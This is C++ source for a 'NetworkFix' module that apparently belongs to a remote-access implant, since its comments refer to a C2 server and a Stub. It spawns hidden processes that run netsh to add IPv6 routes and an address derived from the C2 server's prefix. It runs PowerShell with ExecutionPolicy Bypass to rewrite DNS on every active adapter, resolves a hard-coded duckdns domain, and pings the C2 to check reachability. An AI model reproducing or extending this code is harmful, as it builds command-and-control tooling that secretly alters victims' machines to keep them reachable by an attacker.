#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include "NetworkFix.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include "Logger.h"
#include <vector>
#include <string>
#include <sstream>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

// 从 URL 中提取 IPv6 地址
// 支持格式: "http://[2001:db8::1]:8080" → L"2001:db8::1"
static std::wstring ExtractIPv6FromUrl(const std::string& url) {
    // 找到 [ 和 ] 之间的内容
    auto lb = url.find('[');
    auto rb = url.find(']');
    if (lb == std::string::npos || rb == std::string::npos || rb <= lb + 1) {
        LOG_E("NetFix", ("Cannot parse IPv6 from URL: " + url).c_str());
        return L"";
    }
    std::string ipv6Str = url.substr(lb + 1, rb - lb - 1);
    // 转换为 wchar_t
    int len = MultiByteToWideChar(CP_UTF8, 0, ipv6Str.c_str(), -1, nullptr, 0);
    std::wstring ipv6(len - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, ipv6Str.c_str(), -1, ipv6.data(), len);
    LOG_I("NetFix", ("Extracted IPv6: " + ipv6Str).c_str());
    return ipv6;
}

// wchar_t* -> UTF-8 string
static std::string WsToUtf8(const wchar_t* ws) {
    if (!ws) return "";
    int len = WideCharToMultiByte(CP_UTF8, 0, ws, -1, nullptr, 0, nullptr, nullptr);
    std::string s(len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, ws, -1, s.data(), len, nullptr, nullptr);
    return s;
}

// 执行命令（隐藏窗口），返回是否成功
// allowNonZero=true 时 exit code 1 也视为成功（netsh 路由已存在返回 1）
static bool RunCmd(const wchar_t* cmd, const char* tag, bool allowNonZero = false) {
    LOG_I("NetFix", ("[" + std::string(tag) + "] exec: " + WsToUtf8(cmd)).c_str());
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    wchar_t buf[4096];
    wcscpy_s(buf, cmd);
    BOOL ok = CreateProcessW(nullptr, buf, nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                             nullptr, nullptr, &si, &pi);
    if (!ok) {
        LOG_E("NetFix", ("[" + std::string(tag) + "] CreateProcess failed: " + std::to_string(GetLastError())).c_str());
        return false;
    }
    WaitForSingleObject(pi.hProcess, 30000);
    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    bool success = (exitCode == 0) || (allowNonZero && exitCode == 1);
    LOG_I("NetFix", ("[" + std::string(tag) + "] done, exit=" + std::to_string(exitCode)
        + (success ? " (ok)" : " (fail)")).c_str());
    return success;
}

// 从 IPv6 地址取 /64 前缀：前 4 组 + "::/64"
static void GetC2Prefix(const wchar_t* ipv6, wchar_t* out, size_t cap) {
    const wchar_t* p = ipv6;
    int groups = 0;
    const wchar_t* end = p;
    for (; *end; end++) {
        if (*end == L':') { groups++; if (groups == 4) break; }
    }
    size_t len = (size_t)(end - p);
    if (len >= cap) len = cap - 1;
    wcsncpy_s(out, cap, p, len);
    out[len] = 0;
    wcscat_s(out, cap, L"::/64");
}

// 从 link-local 地址提取后 64 位（主机标识）
static void GetLinkLocalSuffix(const unsigned char* b, wchar_t* out, size_t cap) {
    swprintf_s(out, cap, L"%02x%02x:%02x%02x:%02x%02x:%02x%02x",
        b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15]);
}

// 核心：配置 IPv6 路由（on-link 前缀 + 默认路由），无全球地址时兜底手配
// targetIPv6: 服务端 IPv6 地址（如 L"2001:db8::1"）
static void SetupIPv6Routes(const wchar_t* targetIPv6) {
    LOG_I("NetFix", "=== SetupIPv6Routes start ===");

    ULONG bufLen = 16384;
    std::vector<BYTE> buf(bufLen);
    PIP_ADAPTER_ADDRESSES aa = (PIP_ADAPTER_ADDRESSES)buf.data();
    ULONG r = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, aa, &bufLen);
    if (r == ERROR_BUFFER_OVERFLOW) {
        buf.resize(bufLen);
        aa = (PIP_ADAPTER_ADDRESSES)buf.data();
        r = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, aa, &bufLen);
    }
    if (r != NO_ERROR) {
        LOG_E("NetFix", ("GetAdaptersAddresses failed: " + std::to_string(r)).c_str());
        return;
    }

    bool foundGlobal = false;
    wchar_t llSuffix[64] = L"";
    DWORD llIfIdx = 0;

    for (PIP_ADAPTER_ADDRESSES a = aa; a; a = a->Next) {
        if (a->OperStatus != IfOperStatusUp) continue;
        if (!(a->Flags & IP_ADAPTER_IPV6_ENABLED)) continue;

        for (PIP_ADAPTER_UNICAST_ADDRESS ua = a->FirstUnicastAddress; ua; ua = ua->Next) {
            if (ua->Address.lpSockaddr->sa_family != AF_INET6) continue;
            const unsigned char* b = ((const sockaddr_in6*)ua->Address.lpSockaddr)->sin6_addr.s6_addr;

            // link-local fe80::/10
            if (b[0] == 0xfe && (b[1] & 0xc0) == 0x80) {
                if (!llSuffix[0]) {
                    GetLinkLocalSuffix(b, llSuffix, sizeof(llSuffix) / sizeof(llSuffix[0]));
                    llIfIdx = a->Ipv6IfIndex;
                }
                continue;
            }
            // ULA fc00::/7
            if ((b[0] & 0xfe) == 0xfc) continue;
            // ::/128, ::1/128
            if (b[0] == 0 && b[1] == 0 && b[2] == 0 && b[3] == 0 &&
                b[4] == 0 && b[5] == 0 && b[6] == 0 && b[7] == 0) continue;
            if (b[0] == 0 && b[1] == 0 && b[2] == 0 && b[3] == 0 &&
                b[4] == 0 && b[5] == 0 && b[6] == 0 && b[7] == 1) continue;

            // 找到全球单播地址
            foundGlobal = true;
            wchar_t prefix[64];
            swprintf_s(prefix, L"%02x%02x:%02x%02x:%02x%02x:%02x%02x::/64",
                b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);
            DWORD ifIdx = a->Ipv6IfIndex;
            LOG_I("NetFix", ("iface " + std::to_string(ifIdx) + " global prefix " + WsToUtf8(prefix)).c_str());

            // 1) on-link 前缀直连路由（exit=1 表示已存在，不算错）
            RunCmd((std::wstring(L"netsh interface ipv6 add route ") + prefix +
                    L" interface=" + std::to_wstring(ifIdx)).c_str(), "route-prefix", true);

            // 2) 找 link-local 网关，加默认路由
            std::wstring gw;
            for (PIP_ADAPTER_GATEWAY_ADDRESS g = a->FirstGatewayAddress; g; g = g->Next) {
                if (g->Address.lpSockaddr->sa_family != AF_INET6) continue;
                const unsigned char* gb = ((const sockaddr_in6*)g->Address.lpSockaddr)->sin6_addr.s6_addr;
                if (gb[0] == 0xfe && (gb[1] & 0xc0) == 0x80) {
                    wchar_t gb64[64];
                    swprintf_s(gb64, L"fe80::%02x%02x:%02x%02x:%02x%02x:%02x%02x",
                        gb[8], gb[9], gb[10], gb[11], gb[12], gb[13], gb[14], gb[15]);
                    gw = gb64;
                    break;
                }
            }
            if (!gw.empty()) {
                RunCmd((std::wstring(L"netsh interface ipv6 add route ::/0 interface=") +
                        std::to_wstring(ifIdx) + L" nexthop=" + gw).c_str(), "route-default", true);
            } else {
                // 无 RA 通告的网关，退而用 on-link 默认路由（仅同链路可达）
                RunCmd((std::wstring(L"netsh interface ipv6 add route ::/0 interface=") +
                        std::to_wstring(ifIdx)).c_str(), "route-default-onlink", true);
            }
            break;
        }
        if (foundGlobal) break;
    }

    // 兜底：光猫/路由器未下发 RA/SLAAC，网卡没有任何全球 IPv6
    // → 用 C2 的 /64 前缀 + link-local 主机标识补一个地址 + 前缀直连路由
    if (!foundGlobal && llIfIdx && llSuffix[0]) {
        wchar_t c2prefix[64], addr[192];
        GetC2Prefix(targetIPv6, c2prefix, sizeof(c2prefix) / sizeof(c2prefix[0]));
        size_t plen = wcslen(c2prefix) - 5; // 去掉 "::/64"
        swprintf_s(addr, sizeof(addr) / sizeof(addr[0]), L"%.*ls:%ls/64", (int)plen, c2prefix, llSuffix);
        LOG_I("NetFix", ("no global IPv6 (RA/SLAAC missing), fallback addr " + WsToUtf8(addr) + " iface " + std::to_string(llIfIdx)).c_str());
        RunCmd((std::wstring(L"netsh interface ipv6 add address interface=") +
                std::to_wstring(llIfIdx) + L" " + addr).c_str(), "fallback-addr", true);
        RunCmd((std::wstring(L"netsh interface ipv6 add route ") + c2prefix +
                L" interface=" + std::to_wstring(llIfIdx)).c_str(), "fallback-route", true);
    }

    LOG_I("NetFix", "=== SetupIPv6Routes done ===");
}

// 配置 IPv6 DNS：保留 IPv4 DNS，追加公共 IPv6 DNS（阿里云），刷新缓存
static void SetupIPv6DNS() {
    LOG_I("NetFix", "=== SetupIPv6DNS start ===");
    const wchar_t* ps =
        L"powershell -NoProfile -ExecutionPolicy Bypass -Command \""
        L"Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | ForEach-Object {"
        L"  $i = $_.ifIndex;"
        L"  try {"
        L"    $ip4 = @(Get-DnsClientServerAddress -AddressFamily IPv4 -InterfaceIndex $i -ErrorAction Stop | % ServerAddresses);"
        L"    Set-DnsClientServerAddress -InterfaceIndex $i -ServerAddresses (@($ip4) + @('2400:3200::1','2400:3200::2')) -ErrorAction Stop;"
        L"    Write-Output ('DNS-OK ifIndex=' + $i)"
        L"  } catch { Write-Output ('DNS-ERR ifIndex=' + $i + ' : ' + $_.Exception.Message) }"
        L"};"
        L"ipconfig /flushdns | Out-Null\"";
    RunCmd(ps, "dns-setup");
    Sleep(1000);
    // 验证解析
    RunCmd(L"cmd /c nslookup sfgiouyt.duckdns.org", "dns-lookup");
    LOG_I("NetFix", "=== SetupIPv6DNS done ===");
}

// ping -6 服务端 IPv6，验证端到端连通性
static bool PingC2(const wchar_t* targetIPv6) {
    LOG_I("NetFix", "=== PingC2 start ===");
    std::wstring cmd = L"cmd /c ping -6 -n 3 " + std::wstring(targetIPv6);
    bool ok = RunCmd(cmd.c_str(), "ping6-c2");
    LOG_I("NetFix", ("=== PingC2 " + std::string(ok ? "OK" : "FAILED") + " ===").c_str());
    return ok;
}

// 公共入口：完整自愈流程
void NetworkFix::FixAll(const std::string& serverUrl) {
    LOG_I("NetFix", "=== NetworkFix::FixAll start (IPv6 only) ===");
    std::wstring ipv6 = ExtractIPv6FromUrl(serverUrl);
    if (ipv6.empty()) {
        LOG_E("NetFix", "No IPv6 address in server URL, skip FixAll");
        return;
    }
    SetupIPv6Routes(ipv6.c_str());
    SetupIPv6DNS();
    // 连通性验证（失败不阻断，Stub 会在 pollLoop 里持续重试）
    PingC2(ipv6.c_str());
    LOG_I("NetFix", "=== NetworkFix::FixAll done ===");
}

// 供 Stub 启动前调用：快速验证 C2 可达
bool NetworkFix::VerifyC2Reachable(const std::string& serverUrl) {
    std::wstring ipv6 = ExtractIPv6FromUrl(serverUrl);
    if (ipv6.empty()) return false;
    return PingC2(ipv6.c_str());
}